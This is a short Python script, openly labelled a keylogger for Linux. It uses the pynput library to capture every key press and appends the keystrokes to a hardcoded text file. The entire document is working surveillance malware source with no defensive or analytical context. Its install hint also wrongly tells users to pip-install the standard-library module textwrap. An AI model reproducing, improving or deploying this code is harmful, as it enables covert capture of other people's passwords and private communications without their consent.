#! /usr/bin/env python
# Python keylogger                     
# Use it in LINUX

try:    #import all required modules
    import pynput.keyboard
    import textwrap
except ModuleNotFoundError:
    print("Please install required modules with>\n\tpip install pynput\n\tpip install textwrap")
    
def get_key_press(key):
    try:
        #remove single quote generated by listener
        #replace Key.space, Key.enter, Key.backspace keylogs with SPACE,ENTER,DEL
        current_key = str(key).strip("'").replace("Key.space", "SPACE").replace("Key.enter", "ENTER").replace("Key.backspace", "DEL")
        # Append-add pressed key at end of file
        file = open("/home/d_captainkenya/keylogs.txt","a")         #provide your own filepath
        comelast = ["ENTER", "DEL", "SPACE"]  #Make them appear last in line
        if current_key in comelast:
            file.write(textwrap.fill(current_key, width=5)+ "\n")  #limit length of line
        else:
            file.write(textwrap.fill(current_key, width=5))
        file.close()
    except:
        exit(1)
        
def run():  #Listener
    try:
        keyboard_listener = pynput.keyboard.Listener(on_press=get_key_press)
        with keyboard_listener:
            keyboard_listener.join()
    except KeyboardInterrupt:
        print("\n Cancelled...")
    except:
        print("\nAn Error Occured while listening...")


if __name__ == "__main__":
    run()
